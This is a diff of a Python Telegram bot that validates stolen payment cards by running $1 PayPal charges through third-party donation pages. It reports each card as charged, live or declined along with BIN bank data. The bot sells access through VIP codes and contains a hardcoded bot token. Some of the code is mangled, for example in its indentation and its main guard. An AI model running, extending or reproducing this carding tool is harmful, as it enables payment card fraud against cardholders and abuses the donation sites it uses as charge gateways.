@@ -12,19 +12,21 @@ Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 TOKEN = '7834120140:AAGMxi8uVLSNqCtNt9VB1lvWSkWrSMB6H3w'
 
-------------------- Users ------------------- 
+------------------- Users -------------------
 
-ADMINS = [6843321125] # ضع هنا ID الأدمن
-VIP_USERS = {} # {user_id: expiration_timestamp}
-BANNED_USERS = {} # {user_id: True}
-ALL_USERS = set() # كل مستخدم دخل البوت
+ADMINS = [6843321125]  # ضع هنا ID الأدمن
+VIP_USERS = {}       # {user_id: expiration_timestamp}
+BANNED_USERS = {}    # {user_id: True}
+ALL_USERS = set()    # كل مستخدم دخل البوت
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
 
+🔥 حماية التاسك
+
 user_tasks = {}
 
-------------------- Gates ------------------- 
+------------------- Gates -------------------
 
 GATES = [
 "https://raybensch.com/donations/support-ray/",
@@ -33,11 +35,11 @@ GATES = [
 gate_index = 0
 api_semaphore = asyncio.Semaphore(6)
 
-------------------- Codes ------------------- 
+------------------- Codes -------------------
 
-CODES = {} # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
+CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
 
-------------------- BIN Lookup ------------------- 
+------------------- BIN Lookup -------------------
 
 async def get_bin_info(bin_number):
 urls = [
@@ -68,7 +70,7 @@ continue
 await asyncio.sleep(0.5)
 return "Unknown", "Unknown", "Unknown"
 
-------------------- Check API ------------------- 
+------------------- Check API -------------------
 
 async def check_card_api(card_full):
 global gate_index
@@ -90,25 +92,38 @@ return "declined", result_raw
 except:
 return "declined", "Error"
 
-------------------- Format Response ------------------- 
+------------------- Format Response -------------------
 
 async def format_response(card_full, status, response, taken):
 bin_number = card_full.split("|")[0][:6]
 info, bank, country = await get_bin_info(bin_number)
 
-if status == "approved": status_text = "#Charge 🔥" elif status == "live": status_text = "#Live ✅" else: status_text = "#Declined ❌" return f"""#PayPal_Custom ($1.00) 🌟 
+if status == "approved":  
+    status_text = "#Charge 🔥"  
+elif status == "live":  
+    status_text = "#Live ✅"  
+else:  
+    status_text = "#Declined ❌"  
+
+return f"""#PayPal_Custom ($1.00) 🌟
+
+
+---
 
 [ϟ] Card: {card_full}
 [ϟ] Response: {response}
 [ϟ] Status: {status_text}
 [ϟ] Taken: {taken}s
 
+
+---
+
 [ϟ] Info: {info}
 [ϟ] Bank: {bank}
 [ϟ] Country: {country}
 [⌤] Dev by: . - 🍀"""
 
-------------------- Permissions ------------------- 
+------------------- Permissions -------------------
 
 def can_user_check(user_id, mode="file"):
 if user_id in ADMINS:
@@ -120,7 +135,7 @@ return True
 else:
 return mode == "single"
 
-------------------- /pp ------------------- 
+------------------- /pp -------------------
 
 async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
@@ -151,14 +166,14 @@ taken = round(time.time() - start_time, 2)
 text = await format_response(card_full, status, response, taken)
 await update.message.reply_text(text)
 
-------------------- /stop ------------------- 
+------------------- /stop -------------------
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
 stop_users[user_id] = True
 await update.message.reply_text("Stopped ⛔")
 
-------------------- File Handler ------------------- 
+------------------- File Handler -------------------
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
@@ -176,7 +191,7 @@ user_tasks[user_id] = task
 except Exception as e:
 await update.message.reply_text(f"Error: {e}")
 
-------------------- process_file ------------------- 
+------------------- process_file -------------------
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
@@ -187,7 +202,36 @@ file = await update.message.document.get_file()
 file_path = f"downloads/{file.file_id}.txt"
 await file.download_to_drive(file_path)
 
-results_file_path = f"downloads/results_{file.file_id}.txt" approved = live = declined = 0 panel_msg = await update.message.reply_text("Start Checking... 🔍") with open(file_path, 'r', encoding='utf-8') as f: lines = f.readlines() async def process_line(line): nonlocal approved, live, declined try: match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line) if not match: return None card_full = match[0] start_time = time.time() status, response = await check_card_api(card_full) await asyncio.sleep(random.uniform(0, 2)) taken = round(time.time() - start_time, 2) text = await format_response(card_full, status, response, taken) if status == "approved": approved += 1 await update.message.reply_text(text) elif status == "live": live += 1 await update.message.reply_text(text) else: declined += 1 last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6]) panel = f"""📊 Status 
+results_file_path = f"downloads/results_{file.file_id}.txt"  
+    approved = live = declined = 0  
+    panel_msg = await update.message.reply_text("Start Checking... 🔍")  
+
+    with open(file_path, 'r', encoding='utf-8') as f:  
+        lines = f.readlines()  
+
+    async def process_line(line):  
+        nonlocal approved, live, declined  
+        try:  
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)  
+            if not match:  
+                return None  
+            card_full = match[0]  
+            start_time = time.time()  
+            status, response = await check_card_api(card_full)  
+            await asyncio.sleep(random.uniform(0, 2))  
+            taken = round(time.time() - start_time, 2)  
+            text = await format_response(card_full, status, response, taken)  
+            if status == "approved":  
+                approved += 1  
+                await update.message.reply_text(text)  
+            elif status == "live":  
+                live += 1  
+                await update.message.reply_text(text)  
+            else:  
+                declined += 1  
+
+            last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])  
+            panel = f"""📊 Status
 
 ✅ Charge: {approved} 💥
 🟢 Live: {live} 💫
@@ -213,12 +257,34 @@ except Exception as e:
 print(f"Line Error: {e}")
 return None
 
-for line in lines: if stop_users.get(user_id): await update.message.reply_text("Stopped ⛔") return try: await process_line(line) except Exception as e: print(f"Loop Error: {e}") continue with open(results_file_path, 'w', encoding='utf-8') as result_file: for line in lines: try: r = await format_response(line.strip(), "N/A", "N/A", 0) result_file.write(r + "\n\n") except: continue await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}") except Exception as e: await update.message.reply_text(f"❌ Error: {e}") ------------------- ERROR HANDLER ------------------- 
+for line in lines:  
+        if stop_users.get(user_id):  
+            await update.message.reply_text("Stopped ⛔")  
+            return  
+        try:  
+            await process_line(line)  
+        except Exception as e:  
+            print(f"Loop Error: {e}")  
+            continue  
+
+    with open(results_file_path, 'w', encoding='utf-8') as result_file:  
+        for line in lines:  
+            try:  
+                r = await format_response(line.strip(), "N/A", "N/A", 0)  
+                result_file.write(r + "\n\n")  
+            except:  
+                continue  
+
+    await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")  
+except Exception as e:  
+    await update.message.reply_text(f"❌ Error: {e}")
+
+------------------- ERROR HANDLER -------------------
 
 async def error_handler(update, context):
 print(f"Global Error: {context.error}")
 
-------------------- /try ------------------- 
+------------------- /try -------------------
 
 async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
 if update.effective_user.id not in ADMINS:
@@ -231,7 +297,7 @@ await update.message.reply_text("✅ Sent")
 except:
 await update.message.reply_text("❌ Usage:\n/try 123456789 hello")
 
-------------------- /code ------------------- 
+------------------- /code -------------------
 
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
@@ -248,7 +314,7 @@ VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
 code_data["used"] += 1
 await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")
 
-------------------- /wafa ------------------- 
+------------------- /wafa -------------------
 
 async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
@@ -265,7 +331,7 @@ code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase+string.d
 CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
 await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")
 
-------------------- /show_users ------------------- 
+------------------- /show_users -------------------
 
 async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
@@ -278,7 +344,7 @@ expire = f" expires in {int((VIP_USERS[uid]-time.time())/3600)}h" if uid in VIP_
 msg += f"{uid} - {status}{expire}\n"
 await update.message.reply_text(msg if msg else "No users yet")
 
-------------------- Ban/Unban ------------------- 
+------------------- Ban/Unban -------------------
 
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
@@ -301,18 +367,18 @@ uid = int(context.args[0])
 BANNED_USERS.pop(uid, None)
 await update.message.reply_text(f"User {uid} unbanned ✅")
 
-------------------- /start ------------------- 
+------------------- /start -------------------
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 user_id = update.effective_user.id
 ALL_USERS.add(user_id)
 await update.message.reply_text("Bot Ready ✅")
 
-------------------- Run ------------------- 
+------------------- Run -------------------
 
 def main():
 app = Application.builder().token(TOKEN).build()
-app.add_error_handler(error_handler) # 🔥 مهم جدًا
+app.add_error_handler(error_handler)  # 🔥 مهم جدًا
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CommandHandler("pp", pp))
 app.add_handler(CommandHandler("stop", stop))
@@ -327,4 +393,3 @@ app.run_polling()
 
 if name == "main":
 main()
-
